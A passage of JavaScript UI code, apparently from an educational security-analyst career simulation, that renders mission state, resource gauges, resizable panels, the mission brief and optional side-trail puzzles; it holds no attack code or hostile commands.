  const containment = Math.round(0.5 * progress * 100 + 0.5 * defense);
  let level;
  if (containment >= 75) level = THREAT_LEVELS.normal;
  else if (containment >= 50) level = THREAT_LEVELS.guarded;
  else if (containment >= 25) level = THREAT_LEVELS.elevated;
  else level = THREAT_LEVELS.critical;
  return { ...level, containment, resolved, total, defense };
}
if (typeof window !== 'undefined') window.echCareerThreatLevel = careerThreatLevel;

/* ================================================================== *
 * RESOURCE BAR — always visible at the top of home AND mission screens
 * ------------------------------------------------------------------ *
 * Per-screen duplicated bar: one render fills every `.sim-resbar` host
 * (avoids a global app-shell refactor that would touch the 5 shared
 * .screen layouts). Empty static hosts live in index.html.
 * ================================================================== */
function gaugeCellHtml(g) {
  return `
      <div class="sim-gauge sim-gauge--${g.tone}" data-gauge="${g.key}" title="${g.label} — ${g.desc}">
        <div class="sim-gauge-head">
          <span class="sim-gauge-label">${g.label}</span>
          <span class="sim-gauge-state">${g.state}</span>
        </div>
        <div class="sim-gauge-track" role="meter" aria-valuemin="0" aria-valuemax="100" aria-valuenow="${g.pos}" aria-label="${g.label}: ${g.state}">
          <span class="sim-gauge-pointer" style="left:${g.pos}%"></span>
        </div>
      </div>`;
}

function resbarShellHtml(role, authority, gauges) {
  return `
    <div class="sim-resbar-role">
      <span class="sim-resbar-role-tag">ROLE</span>
      <span class="sim-resbar-role-name">${role.title}</span>
      <span class="sim-resbar-auth"><span class="sim-resbar-auth-tag">AUTHORITY</span> ${authority}</span>
    </div>
    <div class="sim-resbar-resources sim-gauges">${gauges.map(gaugeCellHtml).join('')}</div>`;
}

function renderResourceBar() {
  const role = activeRole();
  const authority = role.allowedActions.map(actionLabel).join(' · ');
  const gauges = careerGauges();
  const roleSig = (role.title || '') + '|' + authority;

  document.querySelectorAll('.sim-resbar').forEach(bar => {
    const cells = bar.querySelector('.sim-gauges');
    // Rebuild the static shell only when missing or the role/authority changed;
    // otherwise update pointers IN PLACE so the CSS transition animates the shift.
    if (!cells || bar.dataset.roleSig !== roleSig) {
      bar.innerHTML = resbarShellHtml(role, authority, gauges);
      bar.dataset.roleSig = roleSig;
      return;
    }
    gauges.forEach(g => {
      const cell = cells.querySelector(`.sim-gauge[data-gauge="${g.key}"]`);
      if (!cell) return;
      cell.className = `sim-gauge sim-gauge--${g.tone}`;
      cell.title = `${g.label} — ${g.desc}`;
      const ptr = cell.querySelector('.sim-gauge-pointer');
      if (ptr) ptr.style.left = g.pos + '%';
      const st = cell.querySelector('.sim-gauge-state');
      if (st) st.textContent = g.state;
      const track = cell.querySelector('.sim-gauge-track');
      if (track) {
        track.setAttribute('aria-valuenow', String(g.pos));
        track.setAttribute('aria-label', `${g.label}: ${g.state}`);
      }
    });
  });
}

// Host bridge: the shipping OCV2 home re-renders through renderOperationsCenter(),
// which calls this to (re)fill the home's .sim-resbar host with current resources.
if (typeof window !== 'undefined') window.echCareerRenderResourceBar = renderResourceBar;
// #120 Consequence Emotion Loop — host (renderOperationsCenter) calls this on every
// home show to surface queued postcards (B) + persistent scar memory (C).
if (typeof window !== 'undefined') window.echCareerRenderHomeConsequences = renderHomeConsequences;

/* ================================================================== *
 * OPERATING CENTER — four-panel mission screen (#careerOps)
 * ------------------------------------------------------------------ *
 * SIM holds the live engine state; SIM.def is the active mission dataset.
 * P2–P4 populate the Evidence / Terminal+Action / Feedback panels.
 * ================================================================== */
const SIM = {
  missionId: null,
  def: null,
  stage: 'investigation',   // investigation -> decision -> report
  listed: false,            // `ls` has been run
  read: new Set(),          // files cat/less'd
  ranCommands: new Set(),   // command ids run (command-model missions)
  evidence: new Set(),      // evidence ids surfaced
  classified: {},           // fileName -> classification value
  identified: null,         // chosen identify option id (command-model missions)
  decision: null,           // chosen action id
  recommendations: [],      // submitted recommendation results
  evReveal: {},             // evidenceId -> 'analyst' | 'technical' (per-item disclosure)
  reflection: { concerns: new Set(), judgment: null }, // suspicious-activity reasoning (ungraded)
  runToken: 0,              // invalidates stray timers across opens
  mapOpen: false,           // network-map overlay visibility (transient, presentation-only)
  dynamic: [],              // active dynamic conditions for this mission (carry-flag driven)
  discoveryJudgments: {},   // challengeId -> { observation, justification } chosen option ids (two-step graded judgments; transient)
  reconsiderations: {},     // reconsiderationId -> chosen option id (revise/hold pivot beat; transient, NON-graded, presentation-only)
  optionOrder: {},          // challengeId -> { observation:[ids], justification:[ids] } stable shuffled reply order (transient view-state; never affects scoring)
  autoOpenedBoardEvents: new Set(), // evidence ids that already auto-opened the board (once each)
  grepUnlockNudged: false,  // file-model grep-triage unlock nudge shown once (transient)
  grepNudgePending: false,  // grep nudge earned while terminal locked — flush on unlock (transient)
  investigationReadyNudged: false, // "all findings in" nudge shown once (transient)
  powers: null,             // Judgment-to-Power transient state (set in openCareerMission via freshPowersState)
  // ---- Phases 3-5 notebook layer (ALL transient / view-state only; never persisted) ----
  markup: [],               // P3 inline mark-up records {id,file,line,start,end,tag,text,challengeId}
  pendingSelection: null,   // P3 selection awaiting a tag {file,line,start,end,text,challengeId}
  markupSeq: 0,             // P3 monotonic id source for mark-up records
  findingChips: {},         // P4 challengeId -> { chipKey: chosenValue } (display-only chip edits)
  committedFindings: [],    // P4 snapshots committed to the on-screen case-file timeline
  analystBet: null,         // P5 optional hypothesis-check state {done,pick,strong}
  markupLog: [],            // P3-5 in-memory telemetry (console.debug mirror; never stored)
  consequence: null,        // #120 Company Health Dials {of,le,tradeoffShown} (transient, reset per mission)
  sparring: null,           // #124 Sarah-sparring view-state {calibration,twoVoice,trails,carry,recap} (transient; set in openCareerMission)
};

function careerMission() { return SIM.def; }

/* Per-mission terminal hint. Command-model missions (def.commands[]) define their
 * own verbs, so `ls`/`cat <file>` return "command not found" there — suggest the
 * mission's real starting command instead. File-model missions keep the ls/cat hint. */
function simTermPlaceholder(def) {
  if (def && Array.isArray(def.commands) && def.commands.length) {
    const first = def.commands.find(c => c.core) || def.commands[0];
    const start = first && first.match && first.match[0];
    return start
      ? 'type a command — try `' + start + '`, or `help`'
      : 'type a command — try `help`';
  }
  return 'type a command — try `ls`, then `cat <file>`, or `help`';
}

function openCareerMission(missionId) {
  const def = CAREER_MISSIONS[missionId];
  if (!def) return;

  SIM.runToken++;
  SIM.missionId = missionId;
  simEndTermGroup();                       // no stale command group carries across missions
  // Teaching mode is per-mission: clear any command left loaded in the input and
  // hide the "press Enter" cue so Mission 1 state never leaks into another mission.
  { const _ti = document.getElementById('simTermInput'); if (_ti) _ti.value = ''; }
  simHideTermLoadCue();
  simRemoveCompleteToast();                // clear any lingering completion toast from a prior mission
  // Dynamic conditions: read prior-mission carry-flags and additively reshape
  // this mission (evidence / commands / risks / brief continuity / outcome).
  // Pure + non-mutating — the canonical def in CAREER_MISSIONS is never changed.
  SIM.dynamic = activeConditions(def.dynamicConditions, CAREER.missionFlags);
  SIM.def = buildEffectiveDef(def, SIM.dynamic);
  SIM.stage = 'investigation';
  SIM.listed = false;
  SIM.read = new Set();
  SIM.ranCommands = new Set();
  SIM.evidence = new Set();
  SIM.lastEvidenceId = null; // Active Investigation Feed — newest-finding tracker.
  SIM.notebookSeen = new Set(); // Feed "notebook updated" notice — sections seen.
  SIM.notebookNotice = '';      // Latest notebook section to fill in (label).
  SIM.feed = [];                // Active Investigation Feed — chronological event log (transient, never persisted).
  lastHudNextText = '';         // HUD next-action change tracker — replays the cue on a new instruction (transient).
  SIM.classified = {};
  SIM.identified = null;
  SIM.decision = null;
  SIM.recommendations = [];
  SIM.evReveal = {};
  SIM.reflection = { concerns: new Set(), judgment: null };
  SIM.discoveryJudgments = {};            // graded discovery challenges (caseFileNotebook missions)
  SIM.reconsiderations = {};              // reconsideration pivot picks (revise/hold) — transient, NON-graded
  SIM.optionOrder = {};                   // stable shuffled reply order per challenge step (transient view-state)
  SIM.autoOpenedBoardEvents = new Set();  // board auto-open fires once per milestone evidence id
  SIM.grepUnlockNudged = false;           // file-model grep-triage unlock nudge (once per open)
  SIM.grepNudgePending = false;           // deferred grep nudge waiting for the terminal to unlock
  SIM.investigationReadyNudged = false;   // "all findings in" nudge (once per open)
  SIM.completionNudgePending = false;     // (D) completion nudge latched while the dock was locked
  SIM.conceptsSeen = new Set();           // just-in-time concept cards already shown (transient)
  SIM.conceptOpen = false;                // concept-card overlay visibility (transient)
  SIM.briefOpen = false;                  // command-brief ("Guided Terminal") overlay visibility (transient)
  SIM.onboardOpen = false;                // (E) first-shift onboarding overlay visibility (transient)
  SIM.decisionWasLocked = false;          // (D) edge-trigger for the decision-unlock handoff (transient)
  SIM.nbEvidenceCount = 0;                // notebook attention: evidence count at last render
  SIM.nbConfidence = null;                // notebook attention: confidence at last render (meter flash)
  SIM._dockActiveId = null;               // Decision Dock: active-decision tracker (transient)
  SIM.reviewAck = {};                      // "review before the call" beat: challenge ids the player has acknowledged reviewing (transient)
  SIM.sideTrailOpen = new Set();          // optional side-trails the analyst has expanded (transient)
  SIM.sideTrailJudgments = {};            // {trailId:{observation,justification}} picks (transient)
  SIM.powers = freshPowersState();        // Judgment-to-Power tools (transient, never persisted)
  SIM.consequence = freshConsequenceState(); // #120 Company Health Dials — reset every mission (never carries across)
  // Phases 3-5 notebook layer — all transient view-state, reset every open.
  SIM.markup = [];                        // P3 inline evidence mark-up records
  SIM.pendingSelection = null;            // P3 selection awaiting a Fact/Anomaly/Unknown tag
  SIM.markupSeq = 0;                      // P3 mark-up id source
  SIM.findingChips = {};                  // P4 display-only chip edits (never feed scoring)
  SIM.committedFindings = [];             // P4 case-file timeline snapshots
  SIM.analystBet = { done: false, pick: null, strong: false }; // P5 optional bet
  SIM.sparring = freshSparringState();    // #124 Sarah-sparring layer (transient view-state)
  SIM.nbCollapsed = {};                   // notebook section collapse state (transient, keyed by kind)
  SIM.focusNotebook = false;              // notebook focus/expand overlay (transient)
  SIM.activeFile = null;                   // on-demand File Reader: currently-open file name (transient)
  SIM.briefExpanded = false;               // Mission Brief compact/expanded state (transient, never persisted)
  SIM.dockExpanded = false;                // Decision Dock peek/expanded state (transient, never persisted)
  { const _ops = document.getElementById('careerOps'); if (_ops) _ops.classList.remove('career--nb-focus'); }
  // Performance-mirror PERK: a session-scoped, NON-persisted carry-over note from
  // the PREVIOUS mission's debrief. Surfaced once here, then cleared. Never saved.
  try {
    if (SARAH_SESSION_PERK && SARAH_SESSION_PERK.fromMission !== missionId) {
      SIM.sparring.carry = SARAH_SESSION_PERK;
      SARAH_SESSION_PERK = null;
    }
  } catch (_) { /* perk carry-over is best-effort */ }
  SIM.markupLog = [];                     // P3-5 in-memory telemetry buffer
  hideMarkupPopover();                    // clear any stray selection popover from a prior open

  // Network-map overlay is review-only + transient: never carries across missions.
  SIM.mapOpen = false;
  if (simMapEl) simMapEl.hidden = true;
  if (simConceptEl) simConceptEl.hidden = true; // concept card never carries across missions
  if (simOnboardEl) simOnboardEl.hidden = true; // onboarding never carries across missions
  simMapIntelHide();
  updateMapButton();

  enterCareerScreen();

  const promptEl = document.getElementById('simTermPrompt');
  if (promptEl) promptEl.textContent = def.promptLabel || 'intern@cybercorp:~/release$';

  renderResourceBar();
  renderCareerHeader();
  renderBriefPanel();
  // Active Investigation Feed (Task #154) — seed the log before the first notebook
  // paint so the shift-start + lead-objective events are visible from the outset.
  emitFeed('start', 'Shift started — ' + (def.title || 'new assignment') + '.');
  { const _obj = feedObjectiveLabel(); if (_obj) emitFeed('objective', 'Objective: ' + _obj); }
  renderEvidencePanel();
  renderTerminalPanel();
  renderFeedbackPanel();
  renderFileReader();   // hidden until the analyst opens a file (SIM.activeFile reset above)
  renderStageBar();     // Workflow stage indicator (Task #154)

  const input = document.getElementById('simTermInput');
  if (input) input.placeholder = simTermPlaceholder(def);
  // (E) First-shift onboarding — show once, before handing over the prompt. When
  // it opens, the CTA holds focus (and closeMissionOnboarding focuses the input
  // on dismiss), so only grab the command line here for returning players.
  maybeShowMissionOnboarding(missionId);
  if (input && !SIM.onboardOpen) setTimeout(() => input.focus(), 50);
}

function returnFromCareerMission() {
  SIM.runToken++;
  simRemoveCompleteToast();
  // Progressive UI Focus (T-F): clear the stage attribute so it never lingers on
  // the hidden mission shell after returning to the Operations Center.
  { const ops = document.getElementById('careerOps'); if (ops) ops.removeAttribute('data-stage'); }
  exitCareerScreen();
  renderResourceBar();
}

/* ------------------------------------------------------------------ *
 * Screen bridge (shipping integration)
 * career-sim.js is an isolated ES module loaded alongside script.js. The host
 * app exposes window.echEnterCareerScreen / window.echExitCareerScreen to swap
 * the Operations Center home (#moduleLanding) and the Career Operating Center
 * (#careerOps) while preserving the shipping site chrome and re-rendering the
 * Operations Center on return. We fall back to direct DOM toggling
 * (#opsCenter / #careerOps) so the module still works standalone (tests).
 * ------------------------------------------------------------------ */
function enterCareerScreen() {
  applySimColPrefs(); // restore collapsed/expanded side columns (presentation-only)
  if (typeof window.echEnterCareerScreen === 'function') { window.echEnterCareerScreen(); return; }
  const o = document.getElementById('opsCenter'); if (o) o.style.display = 'none';
  const c = document.getElementById('careerOps'); if (c) c.style.display = 'flex';
}
function exitCareerScreen() {
  if (typeof window.echExitCareerScreen === 'function') { window.echExitCareerScreen(); return; }
  const c = document.getElementById('careerOps'); if (c) c.style.display = 'none';
  const o = document.getElementById('opsCenter'); if (o) o.style.display = 'flex';
}
function careerScreenOpen() {
  const c = document.getElementById('careerOps');
  return !!c && c.style.display !== 'none';
}

/* ============================================================
 * Collapsible side columns (Task #150) — presentation-only layout state for the
 * mission screen's Mission Brief (left) and Analyst Notebook (right) columns.
 * Stored under a dedicated UI key, never the ech.progress.v1 game blob, so
 * layout choices never touch game progress. The toggle classes live on the
 * never-rebuilt .career-main / .career-col wrappers, so the choice survives the
 * panel re-render cycle.
 * ============================================================ */
const ECH_UI_PREFS_KEY = 'ech.ui.v1';
function echUiGet() {
  try { return JSON.parse(localStorage.getItem(ECH_UI_PREFS_KEY)) || {}; }
  catch { return {}; }
}
function echUiSet(key, value) {
  try { const p = echUiGet(); p[key] = value; localStorage.setItem(ECH_UI_PREFS_KEY, JSON.stringify(p)); }
  catch { /* best-effort */ }
}
function setSimColState(side, collapsed) {
  const main = document.querySelector('.career-main');
  const col = document.getElementById(side === 'left' ? 'simColLeft' : 'simColRight');
  const btn = document.querySelector(`.sim-col-toggle[data-sim-col-toggle="${side}"]`);
  if (!main || !col || !btn) return;
  main.classList.toggle(`career-main--${side}-collapsed`, collapsed);
  col.classList.toggle('is-collapsed', collapsed);
  btn.setAttribute('aria-expanded', String(!collapsed));
  const what = side === 'left' ? 'mission brief' : 'notebook';
  btn.setAttribute('aria-label', collapsed ? `Expand ${what}` : `Collapse ${what}`);
  btn.setAttribute('title', collapsed ? 'Expand panel' : 'Collapse panel');
  const caret = btn.querySelector('.sim-col-toggle-caret');
  if (caret) {
    const collapseGlyph = side === 'left' ? '◂' : '▸';
    const expandGlyph = side === 'left' ? '▸' : '◂';
    caret.textContent = collapsed ? expandGlyph : collapseGlyph;
  }
  // Width is owned by the resize layer: collapsed → rail, expanded → last
  // dragged width (Task #151). The class toggled above is read by applySimColumns.
  applySimColumns();
}
function toggleSimColumn(side) {
  const col = document.getElementById(side === 'left' ? 'simColLeft' : 'simColRight');
  if (!col) return;
  const nowCollapsed = !col.classList.contains('is-collapsed');
  setSimColState(side, nowCollapsed);
  echUiSet(side === 'left' ? 'simLeft' : 'simRight', nowCollapsed);
}
function applySimColPrefs() {
  const p = echUiGet();
  setSimColState('left', !!p.simLeft);
  setSimColState('right', !!p.simRight);
  applySimColumns();
}

/* ============================================================
 * Drag-to-resize side columns (Task #151) — presentation-only layout for the
 * mission screen. Mirrors the OCV2 home resize layer (separate ES module scope,
 * so the parallel const names are intentional). Side widths flow through the
 * --sim-left-w / --sim-right-w custom props (grid template + divider handles
 * both read them); widths persist under ech.ui.v1 (simLeftW/simRightW), never the
 * game blob. No matchMedia listener is needed: the <1100px layout sets
 * grid-template-columns:1fr literally, which overrides the var template, so the
 * inline vars are simply inert when stacked. Drag uses a delta from the start
 * width so the grid gap/padding never enter the math.
 * ============================================================ */
const SIM_RESIZE = {
  rail: 34,
  centerMin: 400,   // the Investigation Terminal never shrinks below this
  defaults: { left: 320, right: 360 },
  min:      { left: 240, right: 260 },
  hardMax:  { left: 520, right: 560 },
};
function simResizeDesktop() {
  return window.matchMedia('(min-width: 1101px)').matches;
}
function simSideCollapsed(side) {
  const main = document.querySelector('.career-main');
  return !!main && main.classList.contains(`career-main--${side}-collapsed`);
}
function simStoredWidth(side) {
  const raw = echUiGet()[side === 'left' ? 'simLeftW' : 'simRightW'];
  return typeof raw === 'number' ? raw : SIM_RESIZE.defaults[side];
}
function simRenderedWidth(side) {
  const main = document.querySelector('.career-main');
  if (!main) return SIM_RESIZE.defaults[side];
  if (simSideCollapsed(side)) return SIM_RESIZE.rail;
  const n = parseFloat(getComputedStyle(main).getPropertyValue(`--sim-${side}-w`));
  return Number.isFinite(n) ? n : simStoredWidth(side);
}
/* Clamp a candidate width: never below the per-side min, never wide enough to
 * starve the terminal. Available track space = clientWidth − padding(24) −
 * gaps(24); keep the center at >= centerMin. */
function simClampWidth(side, w) {
  const main = document.querySelector('.career-main');
  let max = SIM_RESIZE.hardMax[side];
  if (main && main.clientWidth) {
    const other = side === 'left' ? 'right' : 'left';
    max = Math.min(max, main.clientWidth - 48 - simRenderedWidth(other) - SIM_RESIZE.centerMin);
  }
  max = Math.max(SIM_RESIZE.min[side], max);
  return Math.round(Math.min(max, Math.max(SIM_RESIZE.min[side], w)));
}
function simUpdateResizeAria(side) {
  const h = document.querySelector(`.sim-resize-handle[data-sim-resize="${side}"]`);
  if (!h) return;
  h.setAttribute('aria-valuemin', String(SIM_RESIZE.min[side]));
  h.setAttribute('aria-valuemax', String(SIM_RESIZE.hardMax[side]));
  h.setAttribute('aria-valuenow', String(simClampWidth(side, simStoredWidth(side))));
}
/* Single source of truth: write the inline width vars from current state. */
function applySimColumns() {
  const main = document.querySelector('.career-main');
  if (!main) return;
  ['left', 'right'].forEach((side) => {
    if (simSideCollapsed(side)) {
      main.style.setProperty(`--sim-${side}-w`, SIM_RESIZE.rail + 'px');
    } else {
      main.style.setProperty(`--sim-${side}-w`, simClampWidth(side, simStoredWidth(side)) + 'px');
    }
    simUpdateResizeAria(side);
  });
}
function simBeginResize(side, ev) {
  const main = document.querySelector('.career-main');
  if (!main || !simResizeDesktop() || simSideCollapsed(side)) return;
  ev.preventDefault();
  const startX = ev.clientX;
  const startW = simClampWidth(side, simStoredWidth(side));
  main.classList.add('is-col-resizing');
  try { ev.currentTarget.setPointerCapture(ev.pointerId); } catch { /* older browsers */ }
  const onMove = (e) => {
    const dx = e.clientX - startX;
    const w = simClampWidth(side, side === 'left' ? startW + dx : startW - dx);
    main.style.setProperty(`--sim-${side}-w`, w + 'px');
    const h = document.querySelector(`.sim-resize-handle[data-sim-resize="${side}"]`);
    if (h) h.setAttribute('aria-valuenow', String(w));
  };
  const onUp = () => {
    window.removeEventListener('pointermove', onMove);
    window.removeEventListener('pointerup', onUp);
    window.removeEventListener('pointercancel', onUp);
    main.classList.remove('is-col-resizing');
    echUiSet(side === 'left' ? 'simLeftW' : 'simRightW', simRenderedWidth(side));
    applySimColumns();
  };
  window.addEventListener('pointermove', onMove);
  window.addEventListener('pointerup', onUp);
  window.addEventListener('pointercancel', onUp); // interrupted drag → clean up
}
function simResizeKey(side, e) {
  if (!simResizeDesktop() || simSideCollapsed(side)) return;
  let w = simClampWidth(side, simStoredWidth(side));
  const step = e.shiftKey ? 48 : 16;
  if (e.key === 'ArrowLeft') w += side === 'left' ? -step : step;
  else if (e.key === 'ArrowRight') w += side === 'left' ? step : -step;
  else if (e.key === 'Home' || e.key === 'End') w = SIM_RESIZE.defaults[side];
  else return;
  e.preventDefault();
  echUiSet(side === 'left' ? 'simLeftW' : 'simRightW', simClampWidth(side, w));
  applySimColumns();
}
function simResizeReset(side) {
  echUiSet(side === 'left' ? 'simLeftW' : 'simRightW', SIM_RESIZE.defaults[side]);
  applySimColumns();
}
function initSimResize() {
  document.querySelectorAll('.sim-resize-handle[data-sim-resize]').forEach((h) => {
    const side = h.dataset.simResize;
    h.addEventListener('pointerdown', (e) => simBeginResize(side, e));
    h.addEventListener('keydown', (e) => simResizeKey(side, e));
    h.addEventListener('dblclick', () => simResizeReset(side));
  });
}

window.openCareerMission = openCareerMission;
// Shipping integration: lets the host (script.js launchMissionFromMap) decide —
// without hardcoding ids — whether an assignment opens the career-sim interior.
// Evaluated lazily at call time (long after module eval), so referencing
// CAREER_MISSIONS (defined later) is safe, mirroring openCareerMission itself.
window.echCareerHasMission = function echCareerHasMission(id) {
  return !!CAREER_MISSIONS[id];
};
window.CAREER_MISSION_IDS = []; // populated after CAREER_MISSIONS is defined

/* ------------------------------------------------------------------ *
 * Header strip
 * ------------------------------------------------------------------ */
function renderCareerHeader() {
  const def = SIM.def;
  if (!def) return;
  const sev = document.getElementById('careerSeverity');
  const region = document.getElementById('careerRegion');
  const title = document.getElementById('careerTitle');
  if (sev) { sev.textContent = def.severity; sev.setAttribute('data-severity', def.severity); }
  if (region) region.textContent = def.region;
  if (title) title.textContent = def.title;
  renderConsequenceDials(); // #120 (A) Company Health Dials — render at 0/0 on open, updated post-decision
}

/* ------------------------------------------------------------------ *
 * Panel 1 — Mission Brief
 * ------------------------------------------------------------------ */
function renderBriefPanel() {
  const def = SIM.def;
  const host = document.getElementById('simBrief');
  if (!host || !def) return;
  const b = def.brief || {};
  const objectives = (b.objectives || [])
    .map(o => `<li class="sim-brief-obj"><span class="sim-brief-obj-icon" aria-hidden="true">○</span><span>${o}</span></li>`)
    .join('');
  // CASE CONTINUITY — present only when prior-mission carry-flags activated a
  // dynamic condition. Shows the analyst exactly which earlier decision is
  // shaping this case before they touch the terminal.
  const contLines = continuityLines(SIM.dynamic);
  const continuityHtml = contLines.length ? `
      <div class="sim-brief-divider"></div>
      <div class="sim-brief-section-label">CASE CONTINUITY</div>
      <ul class="sim-cont-list">
        ${contLines.map(l => `
        <li class="sim-cont-item sim-cont-item--${l.tone}">
          <div class="sim-cont-from">${l.from}</div>
          <div class="sim-cont-decision">${l.decision}</div>
          <div class="sim-cont-consequence">${l.consequence}</div>
        </li>`).join('')}
      </ul>` : '';
  // SUPERVISOR — CASE MEMORY: adaptive Sarah Reyes lines keyed on carry-flags
  // from earlier cases (good catch / missed thread / over-or-under-escalation).
  // Data-gated on def.supervisorMemory, so Mission 1 (no prior context) shows none.
  const memLines = supervisorMemoryLines(def.supervisorMemory, CAREER.missionFlags);
  const memHtml = memLines.length ? `
      <ul class="sim-supmem-list">
        ${memLines.map(l => `<li class="sim-supmem-item sim-supmem-item--${l.tone}"><span class="sim-supmem-mark" aria-hidden="true"></span><span>${l.text}</span></li>`).join('')}
      </ul>` : '';
  // COMPANY TIMELINE — every prior case you closed, in order, so the brief shows
  // "the company remembers". Grows across the arc; excludes the current mission.
  const history = companyTimeline(CAREER.companyHistory, SIM.missionId, Object.keys(CAREER_MISSIONS));
  const timelineHtml = history.length ? `
      <div class="sim-brief-divider"></div>
      <div class="sim-brief-section-label">COMPANY TIMELINE</div>
      <ol class="sim-timeline-list">
        ${history.map(timelineItemHtml).join('')}
      </ol>` : '';
  // Compact anchor (Task #153) — the case at a glance (title + lead objective +
  // priority) is always visible so the left rail stays quiet. The full brief
  // (operation rows, situation, all objectives, supervisor note/memory, company
  // timeline, case continuity, optional side-trails) is deferred behind "Full
  // brief" — nothing is removed, only collapsed by default. Transient
  // (SIM.briefExpanded); never persisted.
  const expanded = !!SIM.briefExpanded;
  const leadObjective = (b.objectives && b.objectives[0]) ? b.objectives[0] : (b.situation || '');
  const objCount = (b.objectives || []).length;
  const compactHtml = `
      <div class="sim-brief-compact">
        <div class="sim-brief-compact-title">${def.title}</div>
        ${leadObjective ? `<p class="sim-brief-compact-obj">${leadObjective}</p>` : ''}
        <div class="sim-brief-compact-meta">
          <span class="sim-brief-chip sim-brief-chip--alert">${def.priority}</span>
          ${objCount ? `<span class="sim-brief-chip">${objCount} objective${objCount === 1 ? '' : 's'}</span>` : ''}
        </div>
      </div>`;
  const fullHtml = !expanded ? '' : `
      <div class="sim-brief-divider"></div>
      <div class="sim-brief-row"><span class="sim-brief-key">OPERATION ID</span><span class="sim-brief-v">${def.opId}</span></div>
      <div class="sim-brief-row"><span class="sim-brief-key">CURRICULUM</span><span class="sim-brief-v">${def.threatClass}</span></div>
      <div class="sim-brief-row"><span class="sim-brief-key">PRIORITY</span><span class="sim-brief-v sim-brief-v--alert">${def.priority}</span></div>
      <div class="sim-brief-row"><span class="sim-brief-key">ROLE</span><span class="sim-brief-v">${activeRole().title}</span></div>

      <div class="sim-brief-divider"></div>
      <div class="sim-brief-section-label">SITUATION</div>
      <p class="sim-brief-text">${b.situation || ''}</p>

      <div class="sim-brief-section-label">OBJECTIVES</div>
      <ul class="sim-brief-objs">${objectives}</ul>

      <div class="sim-brief-divider"></div>
      <div class="sim-brief-section-label">SUPERVISOR NOTE</div>
      <p class="sim-brief-note">${b.managerNote || ''}</p>
      ${memHtml}
      ${timelineHtml}
      ${continuityHtml}
      ${renderSideTrailsPanel()}`;
  host.innerHTML = `
    <div class="sim-panel-head">
      <span>MISSION BRIEF</span>
      <button type="button" class="sim-brief-toggle" data-brief-toggle aria-expanded="${expanded ? 'true' : 'false'}">${expanded ? '▾ Less' : '▸ Full brief'}</button>
    </div>
    <div class="sim-brief-body">
      ${compactHtml}
      ${fullHtml}
    </div>`;
}

/* One COMPANY TIMELINE entry on the brief: the case, the call you made (with the
 * leadership verdict where there was one), and the single biggest resource move
 * it caused. Presentation-only; reads a persisted history record. */
function timelineItemHtml(t) {
  const moves = (Array.isArray(t.resourceChanges) ? t.resourceChanges.slice() : [])
    .sort((a, b) => Math.abs(b.delta) - Math.abs(a.delta));
  const top = moves[0];
  let impact = '';
  if (top) {
    const d = RESOURCE_DEFS.find(r => r.key === top.key);
    if (d) {
      const diff = top.delta;
      const disp = d.kind === 'money'
        ? (diff >= 0 ? '+' : '−') + '$' + Math.abs(diff).toLocaleString('en-US')
        : (diff > 0 ? '+' : '') + diff;
      const dir = diff > 0 ? 'up' : diff < 0 ? 'down' : 'flat';
      impact = `<span class="sim-timeline-impact sim-timeline-impact--${dir}">${d.label} ${disp}</span>`;
    }
  }
  const decision = t.decisionLabel
    ? `${t.decisionLabel}${t.verdict ? ' — ' + t.verdict : ''}`
    : (t.verdict || 'Resolved');
  return `
    <li class="sim-timeline-item">
      <div class="sim-timeline-op">${t.opId || ''} · ${t.title || t.missionId}</div>
      <div class="sim-timeline-decision">${decision}</div>
      ${impact}
    </li>`;
}

/* ================================================================== *
 * OPTIONAL SIDE-TRAILS (presentation-only, additive, per-mission)
 * ------------------------------------------------------------------ *
 * Optional micro-mysteries offered in the Mission Brief. They NEVER gate
 * progression and NEVER touch scoring, resources, or Investigation Confidence.
 * Tracing one (a two-step judgment, same shape as the discovery cards) pins a
 * permanent relationship node to the Case Board (network map) and is recorded
 * as resolved. Data-gated on def.sideTrails, so missions without it are wholly
 * unaffected. Persistence is idempotent via mission flags:
 *   sideTrailResolved:<trailId>  — the trail is traced
 *   sideTrailBoard:<boardKey>    — its Case Board node/link is revealed
 * Transient picks live in SIM.sideTrailJudgments / SIM.sideTrailOpen and reset
 * each mission open. Wrong picks are low-stakes: feedback shows and the option
 * stays clickable (only the correct pick locks a step), since optional leads
 * should reward curiosity, not punish a guess.
 * ================================================================== */
function simSideTrails() {
  return (SIM.def && Array.isArray(SIM.def.sideTrails)) ? SIM.def.sideTrails : [];
}
function sideTrailById(id) {
  return simSideTrails().find(t => t && t.id === id) || null;
}
function sideTrailResolved(id) {
  return !!CAREER.missionFlags['sideTrailResolved:' + id];
}
function sideTrailBoardRevealed(key) {
  return !!(key && CAREER.missionFlags['sideTrailBoard:' + key]);
}
function sideTrailJudg(id) {
  return (SIM.sideTrailJudgments && SIM.sideTrailJudgments[id]) || {};
}
function sideTrailStepLocked(trail, step) {
  const cfg = trail && trail[step];
  if (!cfg) return false;
  const pick = sideTrailJudg(trail.id)[step];
  return !!pick && pick === cfg.correct;
}
/* A trail is offered once its trigger evidence has surfaced (or immediately if
 * it declares none). Resolved trails always render — as a traced summary. */
function sideTrailAvailable(trail) {
  if (!trail) return false;
  if (sideTrailResolved(trail.id)) return true;
  if (!trail.trigger) return true;
  return SIM.evidence.has(trail.trigger);
}
function visibleSideTrails() {
  return simSideTrails().filter(sideTrailAvailable);
}

/* Toggle a trail's expanded state (transient). */
function openSideTrail(id) {
  if (!SIM.sideTrailOpen) SIM.sideTrailOpen = new Set();
  if (SIM.sideTrailOpen.has(id)) SIM.sideTrailOpen.delete(id);
  else SIM.sideTrailOpen.add(id);
  renderBriefPanel();
}

/* Record a pick for one step. Validates the option BEFORE allocating. Only the
 * correct pick locks a step; a wrong pick is overwritable (retry-friendly). */
function setSideTrailJudgment(trailId, step, optionId) {
  const trail = sideTrailById(trailId);
  if (!trail) return;
  if (sideTrailResolved(trailId)) return;                       // already traced — locked
  if (!sideTrailAvailable(trail)) return;                       // not yet offered
  if (step !== 'observation' && step !== 'justification') return;
  const cfg = trail[step];
  if (!cfg || !Array.isArray(cfg.options)) return;
  if (step === 'justification' && !sideTrailStepLocked(trail, 'observation')) return; // observation first
  if (sideTrailStepLocked(trail, step)) return;                 // correct pick is final
  if (!cfg.options.some(o => o.id === optionId)) return;        // valid option only
  if (!SIM.sideTrailJudgments) SIM.sideTrailJudgments = {};
  const ans = SIM.sideTrailJudgments[trailId] || (SIM.sideTrailJudgments[trailId] = {});
  ans[step] = optionId;
  maybeResolveSideTrail(trail);
  renderBriefPanel();
}

/* Resolve when BOTH steps are answered correctly: persist the resolved + board
 * flags once, and live-refresh the map if it is open. Presentation-only beyond
